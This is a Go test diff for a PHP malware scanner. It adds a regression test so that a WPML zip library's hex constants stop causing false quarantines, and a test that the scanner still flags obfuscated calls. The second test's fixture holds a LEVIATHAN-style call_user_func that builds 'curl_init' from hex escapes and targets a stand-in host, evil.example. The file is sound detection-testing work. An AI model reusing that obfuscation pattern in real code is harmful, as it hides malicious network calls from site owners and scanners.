@@ -323,6 +323,68 @@ func TestAnalyzePHPContentDBMethodExecIsNotShellCall(t *testing.T) {
 	}
 }
 
+// --- analyzePHPContent: call_user_func false-positive regression --------
+//
+// WPML bundles PHPZip (A. Grandt, LGPL) as inc/wpml_zip.php to build XLIFF
+// export archives. The library declares ZIP format constants as quoted hex
+// literals ("\x50\x4b\x03\x04" etc.) and calls `call_user_func( self::$temp )`
+// exactly once to invoke a configurable temp-file factory. The earlier
+// heuristic fired the critical "call_user_func with obfuscated function
+// names" indicator whenever call_user_func co-existed with >5 hex literals
+// anywhere in the buffer, regardless of whether the call actually consumed
+// a hex-built argument. That auto-quarantined wpml_zip.php on every site
+// running WPML and hard-broke wp-login whenever a plugin require_once'd it
+// at bootstrap. The real LEVIATHAN pattern builds the function name on the
+// call_user_func LINE itself (e.g. call_user_func("\x63"."\x75"."\x72"."\x6c")
+// == call_user_func("curl")) -- match that instead.
+func TestAnalyzePHPContentZipLibraryWithHexLiteralsIsClean(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "wpml_zip.php")
+	content := "<?php\n" +
+		"class wpml_zip {\n" +
+		"    const ZIP_LOCAL_FILE_HEADER        = \"\\x50\\x4b\\x03\\x04\";\n" +
+		"    const ZIP_CENTRAL_FILE_HEADER      = \"\\x50\\x4b\\x01\\x02\";\n" +
+		"    const ZIP_END_OF_CENTRAL_DIRECTORY = \"\\x50\\x4b\\x05\\x06\\x00\\x00\\x00\\x00\";\n" +
+		"    const ATTR_VERSION_TO_EXTRACT      = \"\\x14\\x00\";\n" +
+		"    const ATTR_MADE_BY_VERSION         = \"\\x1E\\x03\";\n" +
+		"    const EXTRA_FIELD_NEW_UNIX_GUID    = \"\\x75\\x78\\x0B\\x00\\x01\\x04\\xE8\\x03\\x00\\x00\\x04\\x00\\x00\\x00\\x00\";\n" +
+		"    const S_DOS_A = \"\\x20\\x00\";\n" +
+		"    const S_DOS_D = \"\\x10\\x00\";\n" +
+		"    public static $temp = null;\n" +
+		"    public function openStream() {\n" +
+		"        if (self::$temp !== null) {\n" +
+		"            $temporaryFile = @call_user_func( self::$temp );\n" +
+		"        }\n" +
+		"    }\n" +
+		"}\n"
+	// Pad the file with more hex constants to exceed the 20-hex threshold.
+	for i := 0; i < 20; i++ {
+		content += fmt.Sprintf("const H%d = \"\\x%02x\\x%02x\";\n", i, i, i+1)
+	}
+	_ = os.WriteFile(path, []byte(content), 0644)
+
+	result := analyzePHPContent(path)
+	if result.check != "" {
+		t.Errorf("benign zip library (hex ZIP signatures + plain call_user_func(self::$temp)) must not fire; got check=%q details=%q", result.check, result.details)
+	}
+}
+
+func TestAnalyzePHPContentCallUserFuncHexOnCallLineStillFires(t *testing.T) {
+	dir := t.TempDir()
+	path := filepath.Join(dir, "leviathan-style.php")
+	// Real LEVIATHAN technique: function name built from hex escapes + concat
+	// on the call_user_func line itself. "\x63"."\x75"."\x72"."\x6c" == "curl".
+	content := "<?php\n" +
+		"$payload = \"http://evil.example/x\";\n" +
+		"call_user_func(\"\\x63\" . \"\\x75\" . \"\\x72\" . \"\\x6c\" . \"\\x5f\" . \"\\x69\" . \"\\x6e\" . \"\\x69\" . \"\\x74\", $payload);\n"
+	_ = os.WriteFile(path, []byte(content), 0644)
+
+	result := analyzePHPContent(path)
+	if result.check != "obfuscated_php" {
+		t.Errorf("call_user_func with hex-built function name on same line must fire Critical, got check=%q details=%q", result.check, result.details)
+	}
+}
+
 func TestIsSafePHPInWPDir_WPMLQueue(t *testing.T) {
 	cases := []struct {
 		path string
